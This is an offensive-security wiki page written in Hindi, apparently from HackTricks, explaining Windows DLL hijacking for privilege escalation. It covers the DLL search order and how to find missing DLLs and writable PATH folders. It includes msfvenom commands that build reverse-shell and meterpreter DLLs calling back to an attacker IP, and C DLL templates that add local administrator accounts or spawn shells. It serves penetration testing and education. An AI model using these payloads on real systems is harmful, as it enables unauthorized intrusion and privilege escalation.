# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking एक विश्वसनीय एप्लिकेशन को एक दुर्भावनापूर्ण DLL लोड करने के लिए हेरफेर करने में शामिल है। यह शब्द कई रणनीतियों को शामिल करता है जैसे **DLL Spoofing, Injection, और Side-Loading**। इसका मुख्य उपयोग कोड निष्पादन, स्थिरता प्राप्त करने, और, कम सामान्यतः, विशेषाधिकार वृद्धि के लिए किया जाता है। यहाँ वृद्धि पर ध्यान केंद्रित होने के बावजूद, हाइजैकिंग की विधि उद्देश्यों के बीच समान रहती है।

### Common Techniques

DLL हाइजैकिंग के लिए कई विधियों का उपयोग किया जाता है, प्रत्येक की प्रभावशीलता एप्लिकेशन के DLL लोडिंग रणनीति पर निर्भर करती है:

1. **DLL Replacement**: एक असली DLL को एक दुर्भावनापूर्ण DLL के साथ बदलना, वैकल्पिक रूप से DLL Proxying का उपयोग करके मूल DLL की कार्यक्षमता को बनाए रखना।
2. **DLL Search Order Hijacking**: दुर्भावनापूर्ण DLL को एक खोज पथ में वैध DLL से पहले रखना, एप्लिकेशन के खोज पैटर्न का लाभ उठाना।
3. **Phantom DLL Hijacking**: एक दुर्भावनापूर्ण DLL बनाना जिसे एक एप्लिकेशन लोड करेगा, यह सोचकर कि यह एक गैर-मौजूद आवश्यक DLL है।
4. **DLL Redirection**: खोज पैरामीटर जैसे `%PATH%` या `.exe.manifest` / `.exe.local` फ़ाइलों को संशोधित करना ताकि एप्लिकेशन को दुर्भावनापूर्ण DLL की ओर निर्देशित किया जा सके।
5. **WinSxS DLL Replacement**: WinSxS निर्देशिका में वैध DLL को एक दुर्भावनापूर्ण समकक्ष के साथ प्रतिस्थापित करना, यह विधि अक्सर DLL साइड-लोडिंग से जुड़ी होती है।
6. **Relative Path DLL Hijacking**: उपयोगकर्ता-नियंत्रित निर्देशिका में दुर्भावनापूर्ण DLL रखना जिसमें कॉपी की गई एप्लिकेशन होती है, जो Binary Proxy Execution तकनीकों के समान होती है।

## Finding missing Dlls

सिस्टम के अंदर गायब DLLs खोजने का सबसे सामान्य तरीका [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) को sysinternals से चलाना है, **निम्नलिखित 2 फ़िल्टर सेट करना**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

और केवल **File System Activity** दिखाना:

![](<../../../images/image (153).png>)

यदि आप **सामान्य रूप से गायब dlls** की तलाश कर रहे हैं तो आप इसे कुछ **सेकंड** के लिए चलने देते हैं।\
यदि आप एक **विशिष्ट निष्पादन योग्य के अंदर गायब dll** की तलाश कर रहे हैं तो आपको **"Process Name" "contains" "\<exec name>"** जैसे **दूसरे फ़िल्टर** को सेट करना चाहिए, इसे निष्पादित करें, और घटनाओं को कैप्चर करना बंद करें।

## Exploiting Missing Dlls

विशेषाधिकार बढ़ाने के लिए, हमारे पास सबसे अच्छा मौका है कि हम **एक dll लिख सकें जिसे एक विशेषाधिकार प्रक्रिया लोड करने की कोशिश करेगी** कुछ **स्थान पर जहां इसे खोजा जाएगा**। इसलिए, हम एक **फोल्डर** में **dll लिखने में सक्षम होंगे** जहां **dll पहले खोजा जाता है** उस फोल्डर से पहले जहां **मूल dll** है (अजीब मामला), या हम एक ऐसे फोल्डर में **लिखने में सक्षम होंगे जहां dll खोजा जाएगा** और मूल **dll किसी भी फोल्डर में मौजूद नहीं है**।

### Dll Search Order

**Microsoft दस्तावेज़ के अंदर** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **आप देख सकते हैं कि DLLs को विशेष रूप से कैसे लोड किया जाता है।**

**Windows एप्लिकेशन** DLLs की खोज एक सेट के अनुसार करते हैं **पूर्व-निर्धारित खोज पथ**, एक विशेष अनुक्रम का पालन करते हुए। DLL हाइजैकिंग की समस्या तब उत्पन्न होती है जब एक हानिकारक DLL इन निर्देशिकाओं में से एक में रणनीतिक रूप से रखा जाता है, यह सुनिश्चित करते हुए कि इसे प्रामाणिक DLL से पहले लोड किया जाए। इसे रोकने के लिए एक समाधान यह है कि एप्लिकेशन को आवश्यक DLLs का संदर्भ देते समय पूर्ण पथ का उपयोग करना चाहिए।

आप 32-बिट सिस्टम पर **DLL खोज क्रम** नीचे देख सकते हैं:

1. वह निर्देशिका जिससे एप्लिकेशन लोड हुआ।
2. सिस्टम निर्देशिका। इस निर्देशिका का पथ प्राप्त करने के लिए [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) फ़ंक्शन का उपयोग करें।(_C:\Windows\System32_)
3. 16-बिट सिस्टम निर्देशिका। इस निर्देशिका का पथ प्राप्त करने के लिए कोई फ़ंक्शन नहीं है, लेकिन इसे खोजा जाता है। (_C:\Windows\System_)
4. Windows निर्देशिका। इस निर्देशिका का पथ प्राप्त करने के लिए [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) फ़ंक्शन का उपयोग करें।
1. (_C:\Windows_)
5. वर्तमान निर्देशिका।
6. PATH पर्यावरण चर में सूचीबद्ध निर्देशिकाएँ। ध्यान दें कि इसमें **App Paths** रजिस्ट्री कुंजी द्वारा निर्दिष्ट प्रति-एप्लिकेशन पथ शामिल नहीं है। DLL खोज पथ की गणना करते समय **App Paths** कुंजी का उपयोग नहीं किया जाता है।

यह **डिफ़ॉल्ट** खोज क्रम है जब **SafeDllSearchMode** सक्षम है। जब इसे अक्षम किया जाता है, तो वर्तमान निर्देशिका दूसरे स्थान पर बढ़ जाती है। इस सुविधा को अक्षम करने के लिए, **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** रजिस्ट्री मान बनाएं और इसे 0 पर सेट करें (डिफ़ॉल्ट सक्षम है)।

यदि [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) फ़ंक्शन को **LOAD_WITH_ALTERED_SEARCH_PATH** के साथ कॉल किया जाता है, तो खोज उस निर्देशिका में शुरू होती है जिसमें निष्पादन योग्य मॉड्यूल है जिसे **LoadLibraryEx** लोड कर रहा है।

अंत में, ध्यान दें कि **एक dll को केवल नाम के बजाय पूर्ण पथ को इंगित करते हुए लोड किया जा सकता है**। उस मामले में, वह dll **केवल उस पथ में खोजा जाएगा** (यदि dll की कोई निर्भरताएँ हैं, तो उन्हें केवल नाम से लोड किया गया माना जाएगा)।

खोज क्रम को बदलने के अन्य तरीके हैं लेकिन मैं उन्हें यहाँ समझाने नहीं जा रहा हूँ।

#### Exceptions on dll search order from Windows docs

Windows दस्तावेज़ में मानक DLL खोज क्रम के लिए कुछ अपवाद नोट किए गए हैं:

- जब एक **DLL जिसका नाम पहले से मेमोरी में लोड किए गए एक के साथ साझा होता है** का सामना किया जाता है, तो सिस्टम सामान्य खोज को बायपास करता है। इसके बजाय, यह पहले पुनर्निर्देशन और एक मैनिफेस्ट के लिए जांच करता है, फिर मेमोरी में पहले से मौजूद DLL पर लौटता है। **इस परिदृश्य में, सिस्टम DLL के लिए कोई खोज नहीं करता है**।
- यदि DLL को वर्तमान Windows संस्करण के लिए **ज्ञात DLL** के रूप में पहचाना जाता है, तो सिस्टम ज्ञात DLL के अपने संस्करण का उपयोग करेगा, साथ ही इसकी किसी भी निर्भर DLLs का, **खोज प्रक्रिया को छोड़कर**। रजिस्ट्री कुंजी **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** इन ज्ञात DLLs की एक सूची रखती है।
- यदि एक **DLL की निर्भरताएँ हैं**, तो इन निर्भर DLLs की खोज इस तरह की जाती है जैसे कि उन्हें केवल उनके **मॉड्यूल नामों** द्वारा इंगित किया गया हो, चाहे प्रारंभिक DLL को पूर्ण पथ के माध्यम से पहचाना गया हो या नहीं।

### Escalating Privileges

**Requirements**:

- एक प्रक्रिया की पहचान करें जो **विभिन्न विशेषाधिकारों** (क्षैतिज या पार्श्व आंदोलन) के तहत कार्य करती है या करेगी, जो **एक DLL** की **कमी** है।
- सुनिश्चित करें कि **किसी भी** **निर्देशिका** के लिए **लिखने की अनुमति** उपलब्ध है जिसमें **DLL** के लिए **खोज की जाएगी**। यह स्थान निष्पादन योग्य का निर्देशिका या सिस्टम पथ के भीतर एक निर्देशिका हो सकता है।

हाँ, आवश्यकताएँ खोजना जटिल हैं क्योंकि **डिफ़ॉल्ट रूप से यह अजीब है कि एक विशेषाधिकार प्राप्त निष्पादन योग्य में एक dll की कमी हो** और यह और भी **अजीब है कि एक सिस्टम पथ फ़ोल्डर पर लिखने की अनुमति हो** (आप डिफ़ॉल्ट रूप से नहीं कर सकते)। लेकिन, गलत कॉन्फ़िगर किए गए वातावरण में यह संभव है।\
यदि आप भाग्यशाली हैं और आप आवश्यकताओं को पूरा करते हैं, तो आप [UACME](https://github.com/hfiref0x/UACME) प्रोजेक्ट की जांच कर सकते हैं। भले ही **प्रोजेक्ट का मुख्य लक्ष्य UAC को बायपास करना है**, आप वहां एक **PoC** पा सकते हैं जो Windows संस्करण के लिए DLL हाइजैकिंग के लिए है जिसे आप उपयोग कर सकते हैं (संभवतः केवल उस फ़ोल्डर के पथ को बदलकर जहां आपके पास लिखने की अनुमति है)।

ध्यान दें कि आप **एक फ़ोल्डर में अपनी अनुमतियों की जांच कर सकते हैं**:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
और **PATH के अंदर सभी फ़ोल्डरों की अनुमतियों की जांच करें**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
आप एक निष्पादन योग्य फ़ाइल के आयात और एक dll के निर्यात को भी चेक कर सकते हैं:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
एक पूर्ण गाइड के लिए कि कैसे **Dll Hijacking का दुरुपयोग करके विशेषाधिकार बढ़ाना है** जिसमें **System Path folder** में लिखने की अनुमति है, देखें:

{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### स्वचालित उपकरण

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)जांच करेगा कि क्या आपके पास सिस्टम PATH के अंदर किसी भी फ़ोल्डर पर लिखने की अनुमति है।\
इस भेद्यता का पता लगाने के लिए अन्य दिलचस्प स्वचालित उपकरण हैं **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ और _Write-HijackDll._

### उदाहरण

यदि आप एक exploitable परिदृश्य पाते हैं, तो इसे सफलतापूर्वक शोषण करने के लिए सबसे महत्वपूर्ण चीजों में से एक होगा **कम से कम सभी कार्यों को निर्यात करने वाला एक dll बनाना जो executable इससे आयात करेगा**। किसी भी तरह, ध्यान दें कि Dll Hijacking उपयोगी है ताकि [Medium Integrity level से High **(UAC को बायपास करते हुए)**](../../authentication-credentials-uac-and-efs/#uac) या [**High Integrity से SYSTEM**](../#from-high-integrity-to-system)**।** आप इस dll hijacking अध्ययन के अंदर **कैसे एक मान्य dll बनाएं** का एक उदाहरण पा सकते हैं जो निष्पादन के लिए dll hijacking पर केंद्रित है: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**।**\
इसके अलावा, **अगले अनुभाग** में आप कुछ **बुनियादी dll कोड** पा सकते हैं जो **टेम्पलेट** के रूप में या **निष्क्रिय कार्यों के साथ निर्यातित dll बनाने** के लिए उपयोगी हो सकते हैं।

## **Dlls बनाना और संकलित करना**

### **Dll प्रॉक्सीफाइंग**

बुनियादी रूप से एक **Dll प्रॉक्सी** एक Dll है जो **लोड होने पर आपके दुर्भावनापूर्ण कोड को निष्पादित करने में सक्षम है** लेकिन साथ ही **प्रदर्शित** और **काम** करने के लिए **सभी कॉल को असली पुस्तकालय में रिले करके**।

उपकरण [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) या [**Spartacus**](https://github.com/Accenture/Spartacus) के साथ, आप वास्तव में **एक executable निर्दिष्ट कर सकते हैं और उस पुस्तकालय का चयन कर सकते हैं** जिसे आप प्रॉक्सीफाई करना चाहते हैं और **एक प्रॉक्सीफाइड dll उत्पन्न कर सकते हैं** या **Dll निर्दिष्ट कर सकते हैं** और **एक प्रॉक्सीफाइड dll उत्पन्न कर सकते हैं**।

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक मीटरप्रीटर प्राप्त करें (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक उपयोगकर्ता बनाएं (x86 मैंने x64 संस्करण नहीं देखा):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### आपका खुद का

ध्यान दें कि कई मामलों में, Dll जिसे आप संकलित करते हैं, उसे **कई फ़ंक्शन निर्यात** करने चाहिए जो पीड़ित प्रक्रिया द्वारा लोड किए जाएंगे, यदि ये फ़ंक्शन मौजूद नहीं हैं तो **बाइनरी उन्हें लोड नहीं कर पाएगी** और **शोषण विफल हो जाएगा**।
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## संदर्भ

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)


{{#include ../../../banners/hacktricks-training.md}}
